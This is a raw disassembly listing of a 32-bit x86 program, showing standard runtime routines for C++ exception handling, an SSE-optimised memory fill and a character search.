  4048a3:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4048a6:	8b 07                	mov    (%edi),%eax
  4048a8:	89 01                	mov    %eax,(%ecx)
  4048aa:	c6 41 04 00          	movb   $0x0,0x4(%ecx)
  4048ae:	5f                   	pop    %edi
  4048af:	5d                   	pop    %ebp
  4048b0:	c3                   	ret
  4048b1:	55                   	push   %ebp
  4048b2:	8b ec                	mov    %esp,%ebp
  4048b4:	56                   	push   %esi
  4048b5:	8b 75 08             	mov    0x8(%ebp),%esi
  4048b8:	80 7e 04 00          	cmpb   $0x0,0x4(%esi)
  4048bc:	74 08                	je     0x4048c6
  4048be:	ff 36                	push   (%esi)
  4048c0:	e8 53 1d 00 00       	call   0x406618
  4048c5:	59                   	pop    %ecx
  4048c6:	83 26 00             	andl   $0x0,(%esi)
  4048c9:	c6 46 04 00          	movb   $0x0,0x4(%esi)
  4048cd:	5e                   	pop    %esi
  4048ce:	5d                   	pop    %ebp
  4048cf:	c3                   	ret
  4048d0:	55                   	push   %ebp
  4048d1:	8b ec                	mov    %esp,%ebp
  4048d3:	83 ec 14             	sub    $0x14,%esp
  4048d6:	8b 45 08             	mov    0x8(%ebp),%eax
  4048d9:	53                   	push   %ebx
  4048da:	57                   	push   %edi
  4048db:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4048de:	bb 20 05 93 19       	mov    $0x19930520,%ebx
  4048e3:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4048e6:	85 ff                	test   %edi,%edi
  4048e8:	74 2d                	je     0x404917
  4048ea:	f6 07 10             	testb  $0x10,(%edi)
  4048ed:	74 1e                	je     0x40490d
  4048ef:	8b 08                	mov    (%eax),%ecx
  4048f1:	83 e9 04             	sub    $0x4,%ecx
  4048f4:	56                   	push   %esi
  4048f5:	51                   	push   %ecx
  4048f6:	8b 01                	mov    (%ecx),%eax
  4048f8:	8b 70 20             	mov    0x20(%eax),%esi
  4048fb:	8b ce                	mov    %esi,%ecx
  4048fd:	8b 78 18             	mov    0x18(%eax),%edi
  404900:	ff 15 24 f2 40 00    	call   *0x40f224
  404906:	ff d6                	call   *%esi
  404908:	5e                   	pop    %esi
  404909:	85 ff                	test   %edi,%edi
  40490b:	74 0a                	je     0x404917
  40490d:	f6 07 08             	testb  $0x8,(%edi)
  404910:	74 05                	je     0x404917
  404912:	bb 00 40 99 01       	mov    $0x1994000,%ebx
  404917:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40491a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40491d:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404920:	50                   	push   %eax
  404921:	6a 03                	push   $0x3
  404923:	6a 01                	push   $0x1
  404925:	68 63 73 6d e0       	push   $0xe06d7363
  40492a:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  40492d:	89 7d fc             	mov    %edi,-0x4(%ebp)
  404930:	ff 15 74 f1 40 00    	call   *0x40f174
  404936:	5f                   	pop    %edi
  404937:	5b                   	pop    %ebx
  404938:	c9                   	leave
  404939:	c2 08 00             	ret    $0x8
  40493c:	e8 80 06 00 00       	call   0x404fc1
  404941:	84 c0                	test   %al,%al
  404943:	75 03                	jne    0x404948
  404945:	32 c0                	xor    %al,%al
  404947:	c3                   	ret
  404948:	e8 26 06 00 00       	call   0x404f73
  40494d:	84 c0                	test   %al,%al
  40494f:	75 07                	jne    0x404958
  404951:	e8 a7 06 00 00       	call   0x404ffd
  404956:	eb ed                	jmp    0x404945
  404958:	b0 01                	mov    $0x1,%al
  40495a:	c3                   	ret
  40495b:	55                   	push   %ebp
  40495c:	8b ec                	mov    %esp,%ebp
  40495e:	80 7d 08 00          	cmpb   $0x0,0x8(%ebp)
  404962:	75 0a                	jne    0x40496e
  404964:	e8 3d 06 00 00       	call   0x404fa6
  404969:	e8 8f 06 00 00       	call   0x404ffd
  40496e:	b0 01                	mov    $0x1,%al
  404970:	5d                   	pop    %ebp
  404971:	c3                   	ret
  404972:	6a 08                	push   $0x8
  404974:	68 98 48 41 00       	push   $0x414898
  404979:	e8 72 f8 ff ff       	call   0x4041f0
  40497e:	8b 45 08             	mov    0x8(%ebp),%eax
  404981:	85 c0                	test   %eax,%eax
  404983:	74 7e                	je     0x404a03
  404985:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%eax)
  40498b:	75 76                	jne    0x404a03
  40498d:	83 78 10 03          	cmpl   $0x3,0x10(%eax)
  404991:	75 70                	jne    0x404a03
  404993:	81 78 14 20 05 93 19 	cmpl   $0x19930520,0x14(%eax)
  40499a:	74 12                	je     0x4049ae
  40499c:	81 78 14 21 05 93 19 	cmpl   $0x19930521,0x14(%eax)
  4049a3:	74 09                	je     0x4049ae
  4049a5:	81 78 14 22 05 93 19 	cmpl   $0x19930522,0x14(%eax)
  4049ac:	75 55                	jne    0x404a03
  4049ae:	8b 48 1c             	mov    0x1c(%eax),%ecx
  4049b1:	85 c9                	test   %ecx,%ecx
  4049b3:	74 4e                	je     0x404a03
  4049b5:	8b 51 04             	mov    0x4(%ecx),%edx
  4049b8:	85 d2                	test   %edx,%edx
  4049ba:	74 29                	je     0x4049e5
  4049bc:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4049c0:	52                   	push   %edx
  4049c1:	ff 70 18             	push   0x18(%eax)
  4049c4:	e8 4a 00 00 00       	call   0x404a13
  4049c9:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4049d0:	eb 31                	jmp    0x404a03
  4049d2:	ff 75 0c             	push   0xc(%ebp)
  4049d5:	ff 75 ec             	push   -0x14(%ebp)
  4049d8:	e8 43 00 00 00       	call   0x404a20
  4049dd:	59                   	pop    %ecx
  4049de:	59                   	pop    %ecx
  4049df:	c3                   	ret
  4049e0:	8b 65 e8             	mov    -0x18(%ebp),%esp
  4049e3:	eb e4                	jmp    0x4049c9
  4049e5:	f6 01 10             	testb  $0x10,(%ecx)
  4049e8:	74 19                	je     0x404a03
  4049ea:	8b 40 18             	mov    0x18(%eax),%eax
  4049ed:	8b 08                	mov    (%eax),%ecx
  4049ef:	85 c9                	test   %ecx,%ecx
  4049f1:	74 10                	je     0x404a03
  4049f3:	8b 01                	mov    (%ecx),%eax
  4049f5:	51                   	push   %ecx
  4049f6:	8b 70 08             	mov    0x8(%eax),%esi
  4049f9:	8b ce                	mov    %esi,%ecx
  4049fb:	ff 15 24 f2 40 00    	call   *0x40f224
  404a01:	ff d6                	call   *%esi
  404a03:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404a06:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404a0d:	59                   	pop    %ecx
  404a0e:	5f                   	pop    %edi
  404a0f:	5e                   	pop    %esi
  404a10:	5b                   	pop    %ebx
  404a11:	c9                   	leave
  404a12:	c3                   	ret
  404a13:	55                   	push   %ebp
  404a14:	8b ec                	mov    %esp,%ebp
  404a16:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404a19:	ff 55 0c             	call   *0xc(%ebp)
  404a1c:	5d                   	pop    %ebp
  404a1d:	c2 08 00             	ret    $0x8
  404a20:	55                   	push   %ebp
  404a21:	8b ec                	mov    %esp,%ebp
  404a23:	80 7d 0c 00          	cmpb   $0x0,0xc(%ebp)
  404a27:	74 32                	je     0x404a5b
  404a29:	56                   	push   %esi
  404a2a:	57                   	push   %edi
  404a2b:	8b 7d 08             	mov    0x8(%ebp),%edi
  404a2e:	8b 37                	mov    (%edi),%esi
  404a30:	81 3e 63 73 6d e0    	cmpl   $0xe06d7363,(%esi)
  404a36:	75 21                	jne    0x404a59
  404a38:	83 7e 10 03          	cmpl   $0x3,0x10(%esi)
  404a3c:	75 1b                	jne    0x404a59
  404a3e:	81 7e 14 20 05 93 19 	cmpl   $0x19930520,0x14(%esi)
  404a45:	74 18                	je     0x404a5f
  404a47:	81 7e 14 21 05 93 19 	cmpl   $0x19930521,0x14(%esi)
  404a4e:	74 0f                	je     0x404a5f
  404a50:	81 7e 14 22 05 93 19 	cmpl   $0x19930522,0x14(%esi)
  404a57:	74 06                	je     0x404a5f
  404a59:	5f                   	pop    %edi
  404a5a:	5e                   	pop    %esi
  404a5b:	33 c0                	xor    %eax,%eax
  404a5d:	5d                   	pop    %ebp
  404a5e:	c3                   	ret
  404a5f:	e8 6f 04 00 00       	call   0x404ed3
  404a64:	89 70 10             	mov    %esi,0x10(%eax)
  404a67:	8b 77 04             	mov    0x4(%edi),%esi
  404a6a:	e8 64 04 00 00       	call   0x404ed3
  404a6f:	89 70 14             	mov    %esi,0x14(%eax)
  404a72:	e8 b0 20 00 00       	call   0x406b27
  404a77:	cc                   	int3
  404a78:	e8 56 04 00 00       	call   0x404ed3
  404a7d:	83 c0 10             	add    $0x10,%eax
  404a80:	c3                   	ret
  404a81:	e8 4d 04 00 00       	call   0x404ed3
  404a86:	83 c0 14             	add    $0x14,%eax
  404a89:	c3                   	ret
  404a8a:	cc                   	int3
  404a8b:	cc                   	int3
  404a8c:	cc                   	int3
  404a8d:	cc                   	int3
  404a8e:	cc                   	int3
  404a8f:	cc                   	int3
  404a90:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  404a94:	0f b6 44 24 08       	movzbl 0x8(%esp),%eax
  404a99:	8b d7                	mov    %edi,%edx
  404a9b:	8b 7c 24 04          	mov    0x4(%esp),%edi
  404a9f:	85 c9                	test   %ecx,%ecx
  404aa1:	0f 84 3c 01 00 00    	je     0x404be3
  404aa7:	69 c0 01 01 01 01    	imul   $0x1010101,%eax,%eax
  404aad:	83 f9 20             	cmp    $0x20,%ecx
  404ab0:	0f 86 df 00 00 00    	jbe    0x404b95
  404ab6:	81 f9 80 00 00 00    	cmp    $0x80,%ecx
  404abc:	0f 82 8b 00 00 00    	jb     0x404b4d
  404ac2:	0f ba 25 58 6c 41 00 	btl    $0x1,0x416c58
  404ac9:	01 
  404aca:	73 09                	jae    0x404ad5
  404acc:	f3 aa                	rep stos %al,%es:(%edi)
  404ace:	8b 44 24 04          	mov    0x4(%esp),%eax
  404ad2:	8b fa                	mov    %edx,%edi
  404ad4:	c3                   	ret
  404ad5:	0f ba 25 10 60 41 00 	btl    $0x1,0x416010
  404adc:	01 
  404add:	0f 83 b2 00 00 00    	jae    0x404b95
  404ae3:	66 0f 6e c0          	movd   %eax,%xmm0
  404ae7:	66 0f 70 c0 00       	pshufd $0x0,%xmm0,%xmm0
  404aec:	03 cf                	add    %edi,%ecx
  404aee:	0f 11 07             	movups %xmm0,(%edi)
  404af1:	83 c7 10             	add    $0x10,%edi
  404af4:	83 e7 f0             	and    $0xfffffff0,%edi
  404af7:	2b cf                	sub    %edi,%ecx
  404af9:	81 f9 80 00 00 00    	cmp    $0x80,%ecx
  404aff:	76 4c                	jbe    0x404b4d
  404b01:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  404b08:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  404b0f:	90                   	nop
  404b10:	66 0f 7f 07          	movdqa %xmm0,(%edi)
  404b14:	66 0f 7f 47 10       	movdqa %xmm0,0x10(%edi)
  404b19:	66 0f 7f 47 20       	movdqa %xmm0,0x20(%edi)
  404b1e:	66 0f 7f 47 30       	movdqa %xmm0,0x30(%edi)
  404b23:	66 0f 7f 47 40       	movdqa %xmm0,0x40(%edi)
  404b28:	66 0f 7f 47 50       	movdqa %xmm0,0x50(%edi)
  404b2d:	66 0f 7f 47 60       	movdqa %xmm0,0x60(%edi)
  404b32:	66 0f 7f 47 70       	movdqa %xmm0,0x70(%edi)
  404b37:	8d bf 80 00 00 00    	lea    0x80(%edi),%edi
  404b3d:	81 e9 80 00 00 00    	sub    $0x80,%ecx
  404b43:	f7 c1 00 ff ff ff    	test   $0xffffff00,%ecx
  404b49:	75 c5                	jne    0x404b10
  404b4b:	eb 13                	jmp    0x404b60
  404b4d:	0f ba 25 10 60 41 00 	btl    $0x1,0x416010
  404b54:	01 
  404b55:	73 3e                	jae    0x404b95
  404b57:	66 0f 6e c0          	movd   %eax,%xmm0
  404b5b:	66 0f 70 c0 00       	pshufd $0x0,%xmm0,%xmm0
  404b60:	83 f9 20             	cmp    $0x20,%ecx
  404b63:	72 1c                	jb     0x404b81
  404b65:	f3 0f 7f 07          	movdqu %xmm0,(%edi)
  404b69:	f3 0f 7f 47 10       	movdqu %xmm0,0x10(%edi)
  404b6e:	83 c7 20             	add    $0x20,%edi
  404b71:	83 e9 20             	sub    $0x20,%ecx
  404b74:	83 f9 20             	cmp    $0x20,%ecx
  404b77:	73 ec                	jae    0x404b65
  404b79:	f7 c1 1f 00 00 00    	test   $0x1f,%ecx
  404b7f:	74 62                	je     0x404be3
  404b81:	8d 7c 0f e0          	lea    -0x20(%edi,%ecx,1),%edi
  404b85:	f3 0f 7f 07          	movdqu %xmm0,(%edi)
  404b89:	f3 0f 7f 47 10       	movdqu %xmm0,0x10(%edi)
  404b8e:	8b 44 24 04          	mov    0x4(%esp),%eax
  404b92:	8b fa                	mov    %edx,%edi
  404b94:	c3                   	ret
  404b95:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  404b9b:	74 0e                	je     0x404bab
  404b9d:	88 07                	mov    %al,(%edi)
  404b9f:	47                   	inc    %edi
  404ba0:	83 e9 01             	sub    $0x1,%ecx
  404ba3:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  404ba9:	75 f2                	jne    0x404b9d
  404bab:	f7 c1 04 00 00 00    	test   $0x4,%ecx
  404bb1:	74 08                	je     0x404bbb
  404bb3:	89 07                	mov    %eax,(%edi)
  404bb5:	83 c7 04             	add    $0x4,%edi
  404bb8:	83 e9 04             	sub    $0x4,%ecx
  404bbb:	f7 c1 f8 ff ff ff    	test   $0xfffffff8,%ecx
  404bc1:	74 20                	je     0x404be3
  404bc3:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  404bca:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  404bd0:	89 07                	mov    %eax,(%edi)
  404bd2:	89 47 04             	mov    %eax,0x4(%edi)
  404bd5:	83 c7 08             	add    $0x8,%edi
  404bd8:	83 e9 08             	sub    $0x8,%ecx
  404bdb:	f7 c1 f8 ff ff ff    	test   $0xfffffff8,%ecx
  404be1:	75 ed                	jne    0x404bd0
  404be3:	8b 44 24 04          	mov    0x4(%esp),%eax
  404be7:	8b fa                	mov    %edx,%edi
  404be9:	c3                   	ret
  404bea:	cc                   	int3
  404beb:	cc                   	int3
  404bec:	cc                   	int3
  404bed:	cc                   	int3
  404bee:	cc                   	int3
  404bef:	cc                   	int3
  404bf0:	83 3d 54 6c 41 00 01 	cmpl   $0x1,0x416c54
  404bf7:	72 5f                	jb     0x404c58
  404bf9:	0f b6 44 24 08       	movzbl 0x8(%esp),%eax
  404bfe:	8b d0                	mov    %eax,%edx
  404c00:	c1 e0 08             	shl    $0x8,%eax
  404c03:	0b d0                	or     %eax,%edx
  404c05:	66 0f 6e da          	movd   %edx,%xmm3
  404c09:	f2 0f 70 db 00       	pshuflw $0x0,%xmm3,%xmm3
  404c0e:	0f 16 db             	movlhps %xmm3,%xmm3
  404c11:	8b 54 24 04          	mov    0x4(%esp),%edx
  404c15:	b9 0f 00 00 00       	mov    $0xf,%ecx
  404c1a:	83 c8 ff             	or     $0xffffffff,%eax
  404c1d:	23 ca                	and    %edx,%ecx
  404c1f:	d3 e0                	shl    %cl,%eax
  404c21:	2b d1                	sub    %ecx,%edx
  404c23:	f3 0f 6f 0a          	movdqu (%edx),%xmm1
  404c27:	66 0f ef d2          	pxor   %xmm2,%xmm2
  404c2b:	66 0f 74 d1          	pcmpeqb %xmm1,%xmm2
  404c2f:	66 0f 74 cb          	pcmpeqb %xmm3,%xmm1
  404c33:	66 0f eb d1          	por    %xmm1,%xmm2
  404c37:	66 0f d7 ca          	pmovmskb %xmm2,%ecx
  404c3b:	23 c8                	and    %eax,%ecx
  404c3d:	75 08                	jne    0x404c47
  404c3f:	83 c8 ff             	or     $0xffffffff,%eax
  404c42:	83 c2 10             	add    $0x10,%edx
  404c45:	eb dc                	jmp    0x404c23
  404c47:	0f bc c1             	bsf    %ecx,%eax
  404c4a:	03 c2                	add    %edx,%eax
  404c4c:	66 0f 7e da          	movd   %xmm3,%edx
  404c50:	33 c9                	xor    %ecx,%ecx
  404c52:	3a 10                	cmp    (%eax),%dl
  404c54:	0f 45 c1             	cmovne %ecx,%eax
  404c57:	c3                   	ret
  404c58:	33 c0                	xor    %eax,%eax
  404c5a:	8a 44 24 08          	mov    0x8(%esp),%al
  404c5e:	53                   	push   %ebx
  404c5f:	8b d8                	mov    %eax,%ebx
  404c61:	c1 e0 08             	shl    $0x8,%eax
  404c64:	8b 54 24 08          	mov    0x8(%esp),%edx
  404c68:	f7 c2 03 00 00 00    	test   $0x3,%edx
  404c6e:	74 15                	je     0x404c85
  404c70:	8a 0a                	mov    (%edx),%cl
  404c72:	83 c2 01             	add    $0x1,%edx
  404c75:	3a cb                	cmp    %bl,%cl
  404c77:	74 59                	je     0x404cd2
  404c79:	84 c9                	test   %cl,%cl
  404c7b:	74 51                	je     0x404cce
  404c7d:	f7 c2 03 00 00 00    	test   $0x3,%edx
  404c83:	75 eb                	jne    0x404c70
  404c85:	0b d8                	or     %eax,%ebx
  404c87:	57                   	push   %edi
  404c88:	8b c3                	mov    %ebx,%eax
  404c8a:	c1 e3 10             	shl    $0x10,%ebx
  404c8d:	56                   	push   %esi
  404c8e:	0b d8                	or     %eax,%ebx
  404c90:	8b 0a                	mov    (%edx),%ecx
  404c92:	bf ff fe fe 7e       	mov    $0x7efefeff,%edi
  404c97:	8b c1                	mov    %ecx,%eax
  404c99:	8b f7                	mov    %edi,%esi
  404c9b:	33 cb                	xor    %ebx,%ecx
  404c9d:	03 f0                	add    %eax,%esi
  404c9f:	03 f9                	add    %ecx,%edi
  404ca1:	83 f1 ff             	xor    $0xffffffff,%ecx
  404ca4:	83 f0 ff             	xor    $0xffffffff,%eax
  404ca7:	33 cf                	xor    %edi,%ecx
  404ca9:	33 c6                	xor    %esi,%eax
  404cab:	83 c2 04             	add    $0x4,%edx
  404cae:	81 e1 00 01 01 81    	and    $0x81010100,%ecx
  404cb4:	75 21                	jne    0x404cd7
  404cb6:	25 00 01 01 81       	and    $0x81010100,%eax
  404cbb:	74 d3                	je     0x404c90
  404cbd:	25 00 01 01 01       	and    $0x1010100,%eax
  404cc2:	75 08                	jne    0x404ccc
  404cc4:	81 e6 00 00 00 80    	and    $0x80000000,%esi
  404cca:	75 c4                	jne    0x404c90
  404ccc:	5e                   	pop    %esi
  404ccd:	5f                   	pop    %edi
  404cce:	5b                   	pop    %ebx
  404ccf:	33 c0                	xor    %eax,%eax
  404cd1:	c3                   	ret
  404cd2:	8d 42 ff             	lea    -0x1(%edx),%eax
  404cd5:	5b                   	pop    %ebx
  404cd6:	c3                   	ret
  404cd7:	8b 42 fc             	mov    -0x4(%edx),%eax
  404cda:	3a c3                	cmp    %bl,%al
  404cdc:	74 36                	je     0x404d14
  404cde:	84 c0                	test   %al,%al
  404ce0:	74 ea                	je     0x404ccc
